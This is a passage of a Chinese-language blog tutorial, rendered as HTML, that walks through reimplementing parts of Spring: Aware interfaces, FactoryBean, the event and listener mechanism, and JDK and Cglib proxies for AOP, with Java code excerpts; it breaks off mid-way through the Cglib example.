        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> disposableBeanNames<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Object</span> beanName <span class="token operator">=</span> disposableBeanNames<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token comment">// 从单例工厂中删除</span>
            <span class="token class-name">DisposableBean</span> disposableBean <span class="token operator">=</span> disposableBeans<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 调用的是DisposableBeanAdapter重载的Destroy，最终调用Bean自身定义的Destroy。</span>
                disposableBean<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeansException</span><span class="token punctuation">(</span><span class="token string">"Destroy method on bean with name '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"' threw an exception"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="第八章：感知容器对象"><a href="#第八章：感知容器对象" class="headerlink" title="第八章：感知容器对象"></a>第八章：感知容器对象</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8v6tflmplj30uf0gdn00.jpg" alt="image-20221207133541448"></p>
<blockquote>
<p>需求：在Bean初始化时，能够感知到容器对象，通过容器对象进行一系列操作</p>
</blockquote>
<p>定义Aware接口，表示是可感知的对象，具体由子类实现</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8tv19b89vj32480hsgoc.jpg" alt="image-20221206100227614"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 1. 创建 BeanFactory，并加载 BeanDefinition</span>
    <span class="token comment">// 2. 获取 BeanFactory</span>

    <span class="token comment">// 3. 添加 ApplicationContextAwareProcessor，让继承自 ApplicationContextAware 的 Bean 对象都能感知所属的 ApplicationContext !!! </span>
    beanFactory<span class="token punctuation">.</span><span class="token function">addBeanPostProcessor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ApplicationContextAwareProcessor</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 4. 在 Bean 实例化之前，执行 BeanFactoryPostProcessor </span>
    <span class="token comment">// 5. BeanPostProcessor 需要提前于其他 Bean 对象实例化之前执行注册操作</span>
    <span class="token comment">// 6. 提前实例化单例Bean对象</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的第三步，因为无法在Bean初始化时感知到ApplicationContext属性，所以将ApplicationContext写入一个BeanPostProcessor，这样在执行初始化前就可以获取并分配ApplicationContext了。</p>
<p><code>AbstractAutowireCapableBeanFactory:createBean()调用</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">Object</span> <span class="token function">initializeBean</span><span class="token punctuation">(</span><span class="token class-name">String</span> beanName<span class="token punctuation">,</span> <span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">BeanDefinition</span> beanDefinition<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token comment">// invokeAwareMethods  这里就是将所有内容进行注入的地方</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">Aware</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">BeanFactoryAware</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">BeanFactoryAware</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBeanFactory</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">BeanClassLoaderAware</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">BeanClassLoaderAware</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBeanClassLoader</span><span class="token punctuation">(</span><span class="token function">getBeanClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">BeanNameAware</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">BeanNameAware</span><span class="token punctuation">)</span> bean<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBeanName</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    总之当Bean实现Aware实现类后，当Bean被注入属性后，就会将对应的容器对象进行填充，得到一个完整的对象。</p>
<h2 id="第九章：对象作用域与FactoryBean"><a href="#第九章：对象作用域与FactoryBean" class="headerlink" title="第九章：对象作用域与FactoryBean"></a>第九章：对象作用域与FactoryBean</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8v6yr47ffj30nt0j5jtl.jpg" alt="image-20221207134048099"></p>
<blockquote>
<p>FactoryBean 和 BeanFactory有什么区别？</p>
</blockquote>
<p>​    BeanFactory是用来获取Bean的，FactoryBean它本身是一个Bean，但它本身也是一个工厂，可以内部通过动态代理，凝聚出一个功能更完善的Bean，未来这个获取Bean获取的就是FactoryBean内部代理的Bean，可对原本的方法做出调整，而不需要修改原先基本的代码。</p>
<blockquote>
<p>为什么需要FactoryBean？</p>
</blockquote>
<p>​    可以扩充自己的对象功能了。<em>MyBatis 就是实现了一个 MapperFactoryBean 类，在 getObject 方法中提供 SqlSession 对执行 CRUD 方法的操作</em> </p>
<blockquote>
<p>如何使用FactoryBean?</p>
</blockquote>
<p>​    定义一个类实现FactoryBean接口，实现内部的getObject()，然后注册到容器中即可。</p>
<p><code>AbstractBeanFactory::doGetBean</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">T</span> <span class="token function">doGetBean</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Object</span> sharedInstance <span class="token operator">=</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">null</span> <span class="token operator">!=</span> sharedInstance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 如果是 FactoryBean，则需要调用 FactoryBean#getObject,获取FactoryBean中定义的元素</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span>sharedInstance<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token class-name">BeanDefinition</span> beanDefinition <span class="token operator">=</span> <span class="token function">getBeanDefinition</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Object</span> bean <span class="token operator">=</span> <span class="token function">createBean</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> beanDefinition<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">Object</span> <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span><span class="token class-name">Object</span> beanInstance<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 判断是否为FactoryBean，如果不是则直接返回</span>
  	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>beanInstance <span class="token keyword">instanceof</span> <span class="token class-name">FactoryBean</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> beanInstance<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
		<span class="token comment">// 缓存中找</span>
    <span class="token class-name">Object</span> object <span class="token operator">=</span> <span class="token function">getCachedObjectForFactoryBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>object <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">FactoryBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> factoryBean <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">FactoryBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> beanInstance<span class="token punctuation">;</span>
        <span class="token comment">// !!!  获取或创建FactoryBean内对象</span>
        object <span class="token operator">=</span> <span class="token function">getObjectFromFactoryBean</span><span class="token punctuation">(</span>factoryBean<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> object<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">getObjectFromFactoryBean</span><span class="token punctuation">(</span><span class="token class-name">FactoryBean</span> factory<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>factory<span class="token punctuation">.</span><span class="token function">isSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factoryBeanObjectCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>object <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            object <span class="token operator">=</span> <span class="token function">doGetObjectFromFactoryBean</span><span class="token punctuation">(</span>factory<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>factoryBeanObjectCache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> <span class="token punctuation">(</span>object <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> object <span class="token operator">:</span> <span class="token constant">NULL_OBJECT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>object <span class="token operator">!=</span> <span class="token constant">NULL_OBJECT</span> <span class="token operator">?</span> object <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">doGetObjectFromFactoryBean</span><span class="token punctuation">(</span>factory<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="第十章：容器事件与事件监听器"><a href="#第十章：容器事件与事件监听器" class="headerlink" title="第十章：容器事件与事件监听器"></a>第十章：容器事件与事件监听器</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8vaetjcdqj30rf0jvgob.jpg" alt="image-20221207154002811"></p>
<p>​    这里将用到观察者模式，比如说我们有一个注册用户的业务，注册业务成功后，需要发送短信通知，我们最初就是将注册代码与发送短信代码写在了一起，后来自己定义观察者与被观察者，实际上Spring为了更好的扩容性和灵活性，加入了事件监听机制，我们下面来自己设计如何控制事件：</p>
<blockquote>
<p>定义和实现事件</p>
</blockquote>
<img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8veaor9roj311e0u0acw.jpg" alt="image-20221207175427400" style="zoom:50%;" />

<blockquote>
<p>事件广播器: 可用于添加，删除监听，广播事件，通过对应的监听器进行通知</p>
</blockquote>
<img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8vef18dhyj317t0u0n30.jpg" alt="image-20221207175838126" style="zoom:50%;" />

<blockquote>
<p>事件监听器，自定义监听器，执行自定义事件触发方法</p>
</blockquote>
<img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8vehus93zj30um0jiabt.jpg" alt="image-20221207180120773" style="zoom:50%;" />

<blockquote>
<p>事件如何发送？并触发对应的事件相应方法？</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test_event</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ClassPathXmlApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"classpath:spring.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 发送事件</span>
    applicationContext<span class="token punctuation">.</span><span class="token function">publishEvent</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CustomEvent</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">,</span> <span class="token number">1019129009086763L</span><span class="token punctuation">,</span> <span class="token string">"成功了！"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    applicationContext<span class="token punctuation">.</span><span class="token function">registerShutdownHook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">publishEvent</span><span class="token punctuation">(</span><span class="token class-name">ApplicationEvent</span> event<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 通过事件广播器进行通知</span>
    applicationEventMulticaster<span class="token punctuation">.</span><span class="token function">multicastEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">multicastEvent</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">ApplicationEvent</span> event<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 找到事件对应的监听器，并执行方法</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">ApplicationListener</span> listener <span class="token operator">:</span> <span class="token function">getApplicationListeners</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        listener<span class="token punctuation">.</span><span class="token function">onApplicationEvent</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 监听器是否对该事件感兴趣
 */</span>
<span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">supportsEvent</span><span class="token punctuation">(</span><span class="token class-name">ApplicationListener</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ApplicationEvent</span><span class="token punctuation">></span></span> applicationListener<span class="token punctuation">,</span> <span class="token class-name">ApplicationEvent</span> event<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">ApplicationListener</span><span class="token punctuation">></span></span> listenerClass <span class="token operator">=</span> applicationListener<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 按照 CglibSubclassingInstantiationStrategy、SimpleInstantiationStrategy 不同的实例化类型，需要判断后获取目标 class</span>
    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> targetClass <span class="token operator">=</span> <span class="token class-name">ClassUtils</span><span class="token punctuation">.</span><span class="token function">isCglibProxyClass</span><span class="token punctuation">(</span>listenerClass<span class="token punctuation">)</span> <span class="token operator">?</span> listenerClass<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> listenerClass<span class="token punctuation">;</span>
    <span class="token class-name">Type</span> genericInterface <span class="token operator">=</span> targetClass<span class="token punctuation">.</span><span class="token function">getGenericInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token class-name">Type</span> actualTypeArgument <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ParameterizedType</span><span class="token punctuation">)</span> genericInterface<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getActualTypeArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> className <span class="token operator">=</span> actualTypeArgument<span class="token punctuation">.</span><span class="token function">getTypeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> eventClassName<span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        eventClassName <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeansException</span><span class="token punctuation">(</span><span class="token string">"wrong event class name: "</span> <span class="token operator">+</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 判定此 eventClassName 对象所表示的类或接口与指定的 event.getClass() 参数所表示的类或接口是否相同，或是否是其超类或超接口。</span>
    <span class="token comment">// isAssignableFrom是用来判断子类和父类的关系的，或者接口的实现类和接口的关系的，默认所有的类的终极父类都是Object。如果A.isAssignableFrom(B)结果是true，证明B可以转换成为A,也就是A可以由B转换而来。</span>
    <span class="token keyword">return</span> eventClassName<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h1><h2 id="第11章：基于JDK，Cglib实现AOP切面"><a href="#第11章：基于JDK，Cglib实现AOP切面" class="headerlink" title="第11章：基于JDK，Cglib实现AOP切面"></a>第11章：基于JDK，Cglib实现AOP切面</h2><p>![image-20221208093934125](/Users/qinsicheng/Library/Application Support/typora-user-images/image-20221208093934125.png)</p>
<p>AOP底层是用到了动态代理技术，其中实现方式有：JDK(需要代理类实现接口)，Cglib(可直接代理普通类)，我们先不使用Spring，使用这两个实现方式，完成测试。</p>
<blockquote>
<p>JDK</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test_proxy_jdk</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 被代理对象</span>
    <span class="token class-name">IUserService</span> targetObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 通过反射获取代理对象</span>
    <span class="token class-name">IUserService</span> proxyInstance <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">IUserService</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>
            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            targetObj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token comment">// 拦截器</span>
            <span class="token keyword">new</span> <span class="token class-name">InvocationHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token annotation punctuation">@Override</span>
                <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>targetObj<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------代理执行-------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"method Name: "</span><span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"args: "</span><span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"proxy: "</span><span class="token operator">+</span>proxy<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> userInfo <span class="token operator">=</span> proxyInstance<span class="token punctuation">.</span><span class="token function">queryUserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行结果："</span><span class="token operator">+</span>userInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>Cglib</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Enhancer</span> enhancer <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Enhancer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 设置要代理的类信息</span>
    enhancer<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span><span class="token class-name">UserService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 设置回调拦截器</span>
    enhancer<span class="token punctuation">.</span><span class="token function">setCallback</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MethodInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token annotation punctuation">@Override</span>
